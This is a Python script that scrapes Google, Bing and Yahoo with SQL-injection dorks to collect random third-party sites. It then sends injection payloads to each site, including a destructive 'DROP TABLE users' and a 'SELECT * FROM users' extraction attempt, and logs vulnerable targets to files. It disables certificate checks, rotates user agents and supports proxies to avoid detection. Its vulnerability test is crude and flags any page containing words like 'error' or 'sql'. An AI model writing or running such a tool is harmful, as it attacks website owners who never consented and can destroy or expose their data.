import requests
from bs4 import BeautifulSoup
import random
import time
import logging
import os
import signal
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import threading
from collections import defaultdict
from retrying import retry
import validators
import urllib3
import traceback
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Setup logging for better debugging and tracking
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Configuration
SEARCH_ENGINES = {
    "bing": "https://www.bing.com/search?q={}&first={}",
    "google": "https://www.google.com/search?q={}&start={}",
    "yahoo": "https://search.yahoo.com/search?p={}&b={}",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
]

# Complex SQL Injection Dorks
SQL_INJECTION_DORKS = [
    "index.php?id=", "news.php?id=", "article.php?id=", "product.php?id=", "view.php?id=",
    "category.php?id=", "page.php?id=", "details.php?id=", "blog.php?id=", "single.php?id=",
    "search.php?id=", "list.php?id=", "portfolio.php?id=", "shop.php?id=", "cart.php?id=",
    "productdetails.php?id=", "itemdetails.php?id=", "listing.php?id=", "news_article.php?id=",
    "shopitem.php?id=", "details.php?article_id=", "entry.php?id=", "content.php?id=",
    "wp-content/plugins/", "wp-admin/admin-ajax.php?id=", "admin.php?id=", "user.php?id=",
    "index.php?option=com_", "product_detail.php?id=", "blog_post.php?id=",
    "download.php?id=", "filedetails.php?id=", "search_result.php?id=",
    "news/viewarticle.php?id=", "item.php?product_id=", "order_details.php?id=",
]

DELAY = 2  # Delay between requests in seconds
MAX_WORKERS = 10  # Max workers for parallel scanning
RESULTS_FILE_INJECTION = "injection.txt"
RESULTS_FILE_NOINJECTION = "NOinjection.txt"
RESULTS_FILE_ALL_WEBSITES = "websites.txt"
RESULTS_FILE_SITES_ENDWITH_EQUAL_SIGN = "SitesEndwithEqualSign.txt"  # File for URLs containing '='
RESULTS_FILE_EQUAL_SITE_SQL = "EqualSiteSql.txt"  # File for URLs with '=' and SQL injection
PROXY_LIST = []  # Optional: Add proxies here in the format [{"http": "http://proxy:port"}]

# Thread-safe data structures
injection_urls = set()
no_injection_urls = set()
all_urls = set()
equal_sign_urls = set()  # URLs containing '=' sign
equal_sign_sql_urls = set()  # URLs containing '=' and SQL Injection
lock = threading.Lock()

# Signal handler for graceful exit (Ctrl+C)
def signal_handler(sig, frame):
    logger.info("\nGracefully exiting. Saving results...")
    save_results()
    sys.exit(0)

# Setup signal handler for graceful exit (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Function to initialize files
def initialize_files():
    """Create or clear the result files when the script starts."""
    try:
        with open(RESULTS_FILE_INJECTION, "w") as f:
            f.write("")  # Clear the file
        with open(RESULTS_FILE_NOINJECTION, "w") as f:
            f.write("")  # Clear the file
        with open(RESULTS_FILE_ALL_WEBSITES, "w") as f:
            f.write("")  # Clear the file
        with open(RESULTS_FILE_SITES_ENDWITH_EQUAL_SIGN, "w") as f:
            f.write("")  # Clear the new file for '=' sign URLs
        with open(RESULTS_FILE_EQUAL_SITE_SQL, "w") as f:
            f.write("")  # Clear the file for '=' and SQL Injection sites
        logger.info("Result files initialized and ready for use.")
    except Exception as e:
        logger.error(f"Error initializing files: {e}")

# Function to save results to their respective files
def save_results():
    """Save results to their respective files immediately, ensuring no duplicates."""
    try:
        # Remove duplicates by converting to a set (only unique URLs)
        with lock:
            unique_injection_urls = set(injection_urls)
            unique_no_injection_urls = set(no_injection_urls)
            unique_all_urls = set(all_urls)
            unique_equal_sign_urls = set(equal_sign_urls)
            unique_equal_sign_sql_urls = set(equal_sign_sql_urls)

            # Save URLs containing '=' sign first (penultimate row logic)
            if unique_equal_sign_urls:
                write_to_file(RESULTS_FILE_SITES_ENDWITH_EQUAL_SIGN, unique_equal_sign_urls)
                logger.info(f"Sites with '=' sign saved to {RESULTS_FILE_SITES_ENDWITH_EQUAL_SIGN}")

            # Save SQL injection vulnerable URLs with '=' sign
            if unique_equal_sign_sql_urls:
                write_to_file(RESULTS_FILE_EQUAL_SITE_SQL, unique_equal_sign_sql_urls)
                logger.info(f"Sites with '=' sign and SQL Injection saved to {RESULTS_FILE_EQUAL_SITE_SQL}")

            # Save injection URLs
            if unique_injection_urls:
                write_to_file(RESULTS_FILE_INJECTION, unique_injection_urls)
                logger.info(f"Injection URLs saved to {RESULTS_FILE_INJECTION}")

            # Save non-injection URLs
            if unique_no_injection_urls:
                write_to_file(RESULTS_FILE_NOINJECTION, unique_no_injection_urls)
                logger.info(f"Non-injection URLs saved to {RESULTS_FILE_NOINJECTION}")

            # Save all discovered websites
            if unique_all_urls:
                write_to_file(RESULTS_FILE_ALL_WEBSITES, unique_all_urls)
                logger.info(f"All discovered URLs saved to {RESULTS_FILE_ALL_WEBSITES}")

            # Clear the sets after saving to avoid duplicating during the next scan
            injection_urls.clear()
            no_injection_urls.clear()
            all_urls.clear()
            equal_sign_urls.clear()
            equal_sign_sql_urls.clear()

    except Exception as e:
        logger.error(f"Error saving results: {e}")

def write_to_file(file_path, urls):
    """Helper function to write a list of URLs to a file."""
    try:
        with open(file_path, "a") as file:
            for url in urls:
                file.write(f"{url}\n")
        logger.info(f"Written {len(urls)} URLs to {file_path}")
    except Exception as e:
        logger.error(f"Error writing to file {file_path}: {e}")

# Function to validate and check if a URL is valid
def is_valid_url(url):
    """Check if the URL is valid and well-formed."""
    return validators.url(url)

# Function to test SQL injection vulnerability
@retry(stop_max_attempt_number=3, wait_fixed=2000)
def test_sql_injection(url):
    payloads = [
        "' OR 1=1 --",  # Classic SQL Injection (Boolean-based)
        "' OR 'a'='a",  # Another simple Boolean-based
        "1' AND 1=1 --",  # Basic time-based or error-based
        "1' OR 1=1 --",  # Another boolean-based attack
        "'; DROP TABLE users --",  # Potential SQL Injection Drop Table payload
        "1; SELECT * FROM users --"  # Attempt to pull data from a table
    ]
    
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    
    for payload in payloads:
        try:
            response = requests.get(url + payload, headers=headers, timeout=10, verify=False)
            if check_for_sql_error(response):
                logger.info(f"SQL Injection vulnerability found at: {url}")
                return True  # Found vulnerability
        except requests.exceptions.RequestException as e:
            logger.error(f"Error testing {url} with payload {payload}: {e}")
            continue
    return False  # No SQL injection found after testing all payloads

def check_for_sql_error(response):
    """Check for SQL injection indicators in the response."""
    if "error" in response.text.lower() or "mysql" in response.text.lower():
        return True
    if response.status_code == 500:  # Common error code for SQLi
        return True
    if "sql" in response.text.lower():
        return True
    return False

# Function to search with SQL injection dorks
def search_with_dork(search_engine, dork, num_results=100):
    results = set()
    start = 0
    while len(results) < num_results:
        url = SEARCH_ENGINES[search_engine].format(dork, start)
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
        try:
            response = requests.get(url, headers=headers, timeout=10, verify=False, proxies=proxy)
            response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
            soup = BeautifulSoup(response.content, "html.parser")
            links = extract_links_from_search_page(search_engine, soup)
            results.update(links)
            start += 10  # Adjust based on search engine pagination
            time.sleep(DELAY)
            if not links:  # Break if no links found
                break
        except requests.exceptions.RequestException as e:
            logger.error(f"Error during search: {e}")
            break
    return results

def extract_links_from_search_page(search_engine, soup):
    """Extract valid URLs from search engine results pages."""
    links = []
    if search_engine == "google":
        links = [a['href'] for a in soup.find_all("a", href=True) if "http" in a['href'] and "google" not in a['href']]
    elif search_engine == "bing":
        links = [a['href'] for a in soup.find_all("a", href=True) if "http" in a['href']]
    elif search_engine == "yahoo":
        links = [a['href'] for a in soup.find_all("a", href=True) if "http" in a['href']]
    return links

# Function to scan and classify websites
def scan_and_classify_websites(search_engine, dork):
    logger.info(f"Scanning with {search_engine} using dork: {dork}")
    results = search_with_dork(search_engine, dork)
    
    for url in results:
        if not is_valid_url(url):
            logger.warning(f"Invalid URL skipped: {url}")
            continue
        
        logger.info(f"Testing URL: {url}")
        with lock:
            all_urls.add(url)
        
        # Save URLs with '=' to the SitesEndwithEqualSign file
        if "=" in url:
            with lock:
                equal_sign_urls.add(url)

        if test_sql_injection(url):
            logger.info(f"SQL Injection vulnerability found: {url}")
            with lock:
                injection_urls.add(url)
                if "=" in url:
                    equal_sign_sql_urls.add(url)
            save_results()  # Save immediately after detecting a vulnerable URL
        else:
            logger.info(f"No SQL Injection vulnerability: {url}")
            with lock:
                no_injection_urls.add(url)
            save_results()  # Save immediately after detecting a non-vulnerable URL

# Main entry point
if __name__ == "__main__":
    logger.info("Starting SQL Injection Scan...")

    # Initialize files
    initialize_files()

    # Use ThreadPoolExecutor for parallel scanning
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for search_engine in SEARCH_ENGINES:
            for dork in SQL_INJECTION_DORKS:
                futures.append(executor.submit(scan_and_classify_websites, search_engine, dork))
        
        # Wait for all futures to complete
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"Error during scan: {e}")

    # After scan, save results
    logger.info("Scan completed. Saving results...")
    save_results()
